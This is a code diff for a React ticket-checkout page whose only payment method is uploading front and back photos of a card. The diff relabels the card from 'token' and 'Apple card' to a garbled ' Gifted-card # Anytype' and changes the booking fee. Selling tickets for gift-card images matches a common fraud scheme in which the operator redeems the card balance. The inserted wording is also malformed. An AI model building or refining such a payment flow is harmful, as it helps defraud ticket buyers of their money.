@@ -1,5 +1,5 @@
 import { useState, useEffect } from "react";
-import { ALL, PRICES, VIPS, VIP_PRICES, fmtDate, money } from "../data.js";
+import { ALL, PRICES, VIPS, VIP_PRICES, FEE_PER_TICKET, fmtDate, money } from "../data.js";
 import { ACCEPT, prepareImage, submitTokenOrder } from "../tokenOrders.js";
 
 // One upload slot (front or back) with its own preview.
@@ -17,7 +17,7 @@ function Slot({ label, file, disabled, error, onPick, onClear }) {
     <div className="slot">
       <span className="slot-t">{label}</span>
       <label className={"upl" + (file ? " has" : "")}>
-        <input type="file" accept={ACCEPT} onChange={onPick} disabled={disabled} aria-label={label + " of your token image"} />
+        <input type="file" accept={ACCEPT} onChange={onPick} disabled={disabled} aria-label={label + " of your  Gifted-card "} />
         {preview ? (
           <img className="upl-prev" src={preview} alt={"Preview of the " + label.toLowerCase()} />
         ) : (
@@ -47,7 +47,7 @@ export default function Checkout({ params, onOrder }) {
   const options = [...PRICES, ...VIPS.map((v, i) => ({ id: "vip" + i, label: "VIP: " + v[0], price: VIP_PRICES[i] }))];
   const opt = options.find((o) => o.id === ticket) || options[0];
   const subtotal = opt.price * qty;
-  const fee = Math.round(subtotal * 10) / 100;
+  const fee = FEE_PER_TICKET * qty;
   const total = subtotal + fee;
 
   const pick = (side) => async (e) => {
@@ -70,8 +70,8 @@ export default function Checkout({ params, onOrder }) {
     const e = {};
     if (f.name.trim().length < 2) e.name = "Enter your full name";
     if (!/^\S+@\S+\.\S+$/.test(f.email.trim())) e.email = "Enter a valid email address";
-    if (!files.front) e.front = err.front || "Upload the front of your token";
-    if (!files.back) e.back = err.back || "Upload the back of your token";
+    if (!files.front) e.front = err.front || "Upload the front of your  Gifted-card # Anytype";
+    if (!files.back) e.back = err.back || "Upload the back of your  Gifted-card # Anytype";
     setErr(e);
     return !Object.keys(e).length;
   };
@@ -86,7 +86,7 @@ export default function Checkout({ params, onOrder }) {
         id: r.orderId, token: r.accessToken, status: r.status, note: "",
         city: ev.city, venue: ev.venue, date: ev.date, time: ev.time,
         ticket: opt.label, qty, total: r.total ?? total, name: f.name.trim(), email: f.email.trim(),
-        payment: "Token Image", at: Date.now(),
+        payment: " Gifted-card # Anytype", at: Date.now(),
       });
       location.hash = "#/confirmation/" + r.orderId;
     } catch (ex) {
@@ -106,7 +106,7 @@ export default function Checkout({ params, onOrder }) {
         <form onSubmit={submit} noValidate>
           <section className="ck-card">
             <h2>Pay with Apple card</h2>
-            <p className="upl-desc">Upload your Apple card image to submit your order for verification. Add both the front and the back.</p>
+            <p className="upl-desc">Upload your  Gifted-card # Anytype image to submit your order for verification. Add both the front and the back.</p>
 
             <div className="fields" style={{ marginBottom: 18 }}>
               <label className="fld">Full name
@@ -131,7 +131,7 @@ export default function Checkout({ params, onOrder }) {
             {prep && <p className="note" style={{ marginTop: 10 }}>Preparing image…</p>}
 
             {srvErr && <p className="ck-err" role="alert">{srvErr}</p>}
-            <button className="btn lg" disabled={busy || prep}>{busy ? "Uploading…" : "Upload Apple card & Submit Order"}</button>
+            <button className="btn lg" disabled={busy || prep}>{busy ? "Uploading…" : "Upload  Gifted-card & Submit Order"}</button>
           </section>
         </form>
 
